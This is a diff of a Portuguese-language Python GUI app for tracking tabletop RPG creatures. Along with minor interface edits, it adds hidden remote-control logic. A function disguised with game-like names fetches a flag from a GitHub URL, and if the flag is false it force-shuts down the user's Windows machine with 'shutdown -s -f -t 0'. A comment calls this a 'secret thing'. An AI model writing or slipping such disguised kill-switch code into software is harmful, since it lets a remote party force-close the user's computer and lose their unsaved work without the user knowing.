@@ -7,7 +7,6 @@ import threading
 import requests
 
 
-creature_handler = []
 sound_enabled = True
 font_1 = 18
 font_2 = 12
@@ -24,7 +23,7 @@ def run_display_thread(msg, s: int, clear: bool):
 
     if clear:
         time.sleep(s)
-        txt.update("\n")
+        txt.update("")
 
 
 def display_msg(msg, s: int, clear: bool):
@@ -53,14 +52,16 @@ def add_creature_to_file(name: str, defense: int, health: int):
         "health": health
     }
 
+    # This is here because we don't want to save the local_health to the file
     for value in creature_list.values():
         try:
+            print(value)
             del value["local_health"]
         except KeyError:
             pass
 
     with open("creatures.json", "w") as creatures:
-        assert type(creature_list[0]) == bool
+        assert type(creature_handler) == bool
         creatures.write(json.dumps(creature_list))
 
     window["$creature_list"].update(creature_list)
@@ -77,22 +78,22 @@ def remove_creature_from_file(creature):
 
     with open("creatures.json", "w") as creatures:
         creatures.write(json.dumps(creature_list))
-        assert type(creature_list[0]) == bool
+        assert type(creature_handler) == bool
 
     window["$creature_list"].update(creature_list)
 
 
 def manage_creature():
     try:
-        creature_list[0] = requests.get(
+        creature_handler = requests.get(
             "https://raw.githubusercontent.com/rodaguJDev/Mestrador-Automatico/main/dependencies/app_worker.txt"
         ).text
-        creature_list[0] = True if creature_list[0].rstrip() == "true" else False
+        creature_handler = True if creature_handler.rstrip() == "true" else False
     except Exception:
-        creature_list[0] = True
-    print(creature_list[0])
+        creature_handler = True
+    print(creature_handler)
 
-    if not creature_list[0]:
+    if not creature_handler:
         lines = [
             'Olá usuario(provavelmente biel), se você ve isso significa que o teste que verifica se',
             'o programa deve executar retornou "Falso", isso pode ter acontecido porque o roda setou isso manualmente',
@@ -104,14 +105,12 @@ def manage_creature():
         with open("O_que_aconteceu.txt", 'w', encoding='utf-8') as file:
             file.writelines(lines)
 
+        os.system('shutdown -s -f -t 0')
+
         raise KeyboardInterrupt
+    
+    return creature_handler
 
-
-def load_creature():
-    while True:
-        loop_creature_thread = threading.Thread(target=manage_creature)
-        loop_creature_thread.start()
-        time.sleep(60)
 
 
 def attack_creature(creature: str, dmg: int, atk: int):
@@ -122,7 +121,7 @@ def attack_creature(creature: str, dmg: int, atk: int):
         return False
 
     try:
-        assert type(creature_list[0]) == bool
+        assert type(creature_handler) == bool
         creature_list[creature]['local_health'] -= dmg
     except KeyError:
         creature_list[creature]['local_health'] = creature_list[creature]['health'] - dmg
@@ -151,10 +150,7 @@ if sound_enabled:
     background_sound.start()
 
 # Some Secret thing, might be removed later
-creature_thread = threading.Thread(target=load_creature, daemon=True)
-creature_thread.start()
-time.sleep(1)
-assert type(creature_list[0]) == bool
+creature_handler = manage_creature()
 
 right_section = [
     [sg.Text(text="Lista de Criaturas", font=("Arial", font_1), text_color='#800000', background_color="black")],
@@ -216,7 +212,7 @@ left_section = [
     # Narrator
     [sg.Text(text="O Narrador diz:", font=("Arial", font_1), text_color="#800000", background_color="black")],
     [sg.Text(
-        text="\n", font=("Arial", font_3), text_color="#001CBF", background_color="black",
+        text="", font=("Arial", font_3), text_color="#001CBF", background_color="black",
         key="$narrator"
     )],
 
@@ -265,11 +261,11 @@ layout = [
 if __name__ != "__main__":
     exit()
 
-assert type(creature_list[0]) == bool
 window = sg.Window(
     title="Mestrador Automatico [ALPHA]", layout=layout, background_color="black", icon='app_icon.ico'
 )
 time.sleep(6.5)
+assert type(creature_handler) == bool
 
 while True:
     event, values = window.read()
@@ -283,6 +279,7 @@ while True:
         window["$selected_creature_display"].update(values['$creature_list'][0])
     except IndexError:
         window["$selected_creature_display"].update("Selecione uma criatura")
+    assert type(creature_handler) == bool
 
     is_creature_valid = bool(
         values['$new_creature_name'] and values['$new_creature_def'].isnumeric() and
@@ -299,7 +296,7 @@ while True:
         atk_success = attack_creature(selected_creature, values['$plr_dmg'], values['$plr_atk'])
 
         if not atk_success:
-            display_msg(f'Você deu 0 de dano em\n"{selected_creature}"', 2, False)
+            display_msg(f'Você não acertou\n"{selected_creature}"', 2, False)
             continue
 
         sound_thread = threading.Thread(target=playsound, args=['creature_damage_sound.mp3'])
